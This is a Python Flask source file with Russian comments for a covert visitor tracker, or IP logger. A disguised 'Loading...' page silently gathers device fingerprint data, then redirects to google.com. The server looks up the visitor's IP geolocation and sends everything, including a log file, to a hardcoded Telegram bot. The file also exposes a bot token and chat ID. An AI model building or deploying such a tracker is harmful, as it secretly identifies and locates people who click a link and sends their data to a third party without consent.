from datetime import datetime
import os
from flask import Flask, jsonify, render_template_string, request
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "8694192081:AAHOX9HIqNuYPt1hhq9Ua9d4SDS6mJ0s0tw"
TELEGRAM_CHAT_ID = "8564758689"


def send_telegram_message(text):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
  payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
  try:
    requests.post(url, json=payload, timeout=5)
  except Exception as e:
    print(f"Ошибка отправки текста: {e}")


def send_telegram_document(file_path, caption):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
  try:
    with open(file_path, "rb") as f:
      files = {"document": f}
      data = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}
      requests.post(url, data=data, files=files, timeout=10)
  except Exception as e:
    print(f"Ошибка отправки файла: {e}")


# HTML-прокладка со сбором расширенных данных через JavaScript
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <script>
        const data = {
            screenResolution: window.screen.width + "x" + window.screen.height,
            colorDepth: window.screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
            deviceMemory: navigator.deviceMemory || 'Неизвестно',
            cookiesEnabled: navigator.cookieEnabled
        };

        fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(() => {
            window.location.href = "https://google.com";
        }).catch(() => {
            window.location.href = "https://google.com";
        });
    </script>
</body>
</html>
"""


@app.route("/")
def index():
  return render_template_string(HTML_PAGE)


@app.route("/collect", methods=["POST"])
def collect():
  client_data = request.json or {}

  # Получаем IP-адрес
  ip = request.headers.get(
      "X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr)
  )
  if "," in ip:
    ip = ip.split(",")[0].strip()

  visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
  user_agent = request.headers.get("User-Agent", "Не определен")

  # Запрос геоданных по IP через бесплатный сервис
  geo_info = {}
  try:
    geo_resp = requests.get(
        f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,query",
        timeout=3,
    )
    if geo_resp.status_code == 200:
      geo_info = geo_resp.json()
  except:
    pass

  country = geo_info.get("country", "Не определено")
  region = geo_info.get("regionName", "Не определено")
  city = geo_info.get("city", "Не определено")
  isp = geo_info.get("isp", "Не определено")

  # Чистый структурированный лог без лишнего мусора
  log_content = (
      f"=== ИНФОРМАЦИЯ О ПЕРЕХОДЕ ===\n"
      f"Время: {visit_time}\n"
      f"IP-адрес: {ip}\n"
      f"Страна: {country}\n"
      f"Регион: {region}\n"
      f"Город: {city}\n"
      f"Провайдер (ISP): {isp}\n"
      f"Разрешение экрана: {client_data.get('screenResolution', 'Н/Д')}\n"
      f"Часовой пояс: {client_data.get('timezone', 'Н/Д')}\n"
      f"Язык системы: {client_data.get('language', 'Н/Д')}\n"
      f"Платформа: {client_data.get('platform', 'Н/Д')}\n"
      f"Ядра процессора: {client_data.get('hardwareConcurrency', 'Н/Д')}\n"
      f"Оперативная память: {client_data.get('deviceMemory', 'Н/Д')} ГБ\n"
      f"User-Agent: {user_agent}\n"
      f"===============================\n\n"
  )

  file_name = "log.txt"
  with open(file_name, "a", encoding="utf-8") as f:
    f.write(log_content)

  # Компактное сообщение для Telegram
  message_text = (
      f"🔔 *Новый переход!*\n\n"
      f"⏱ *Время:* `{visit_time}`\n"
      f"🌐 *IP:* `{ip}`\n"
      f"📍 *Место:* `{country}, {city}`\n"
      f"🏢 *Провайдер:* `{isp}`\n"
      f"💻 *Экран:* `{client_data.get('screenResolution', 'Н/Д')}`\n"
      f"🌍 *Часовой пояс:* `{client_data.get('timezone', 'Н/Д')}`"
  )

  send_telegram_message(message_text)
  send_telegram_document(file_name, caption="📁 Полный структурированный лог")

  return jsonify({"status": "ok"})


if __name__ == "__main__":
  port = int(os.environ.get("PORT", 5000))
  app.run(host="0.0.0.0", port=port)
